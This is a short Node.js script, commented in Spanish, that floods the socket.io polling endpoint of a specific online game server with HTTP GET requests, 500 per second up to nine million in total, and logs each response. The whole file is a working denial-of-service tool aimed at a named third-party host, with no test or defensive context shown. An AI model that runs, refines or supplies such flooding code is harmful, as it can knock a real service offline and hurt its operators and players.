const axios = require('axios');

const url = 'https://ws.playshinobirevenge.com/socket.io/?id=128&EIO=4&transport=polling&t=P4_ll61'; // Cambia esto a la URL que necesites
const requestsPerSecond = 500;
const totalRequests = 9000000; // Número total de solicitudes que deseas enviar

let sentRequests = 0;

const sendRequest = async () => {
  try {
    const response = await axios.get(url);
    console.log(`Solicitud enviada. Estado: ${response.status}`);
  } catch (error) {
    console.error('Error al enviar la solicitud:', error.message);
  }
};

const startSendingRequests = () => {
  // Controlar el envío de solicitudes
  const interval = setInterval(() => {
    for (let i = 0; i < requestsPerSecond; i++) {
      if (sentRequests >= totalRequests) {
        clearInterval(interval);
        console.log('Todas las solicitudes han sido enviadas.');
        break;
      }
      sendRequest();
      sentRequests++;
    }
  }, 1000);
};

// Exporta la función que inicia el envío de solicitudes
module.exports = startSendingRequests;